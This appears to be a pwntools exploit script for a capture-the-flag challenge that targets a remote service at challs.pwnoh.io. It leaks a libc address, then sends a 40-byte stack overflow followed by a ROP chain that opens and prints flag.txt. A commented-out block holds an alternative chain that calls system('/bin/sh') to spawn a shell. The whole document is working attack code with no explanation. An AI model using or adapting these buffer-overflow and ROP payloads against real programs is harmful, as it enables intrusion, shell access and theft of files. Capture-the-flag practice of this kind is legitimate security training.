from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'x86-64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.pwnoh.io", 13371)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

ru("at ")

libc.address = int(rl().strip(), 16) - libc.sym['system']
ic(hex(libc.address))
'''
ret = libc.address + 0x00000000000f8c92
payload = flat(
    'a' * 40,
    gad(libc, "rdi"),
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.sym['system']
)
sl(payload)
sl(b'ls')'''

rop = ROP(libc)
rop.call('read', [0, libc.bss(), 9])
rop.call('open', [libc.bss(), 0, 0])
rop.call('read', [3, libc.bss(), 200])
rop.call('write', [1, libc.bss(), 200])
chain = rop.chain()
print(rop.dump())

payload = b'a'*40 + chain
sl(payload)
s(b'flag.txt\x00')
io.interactive()
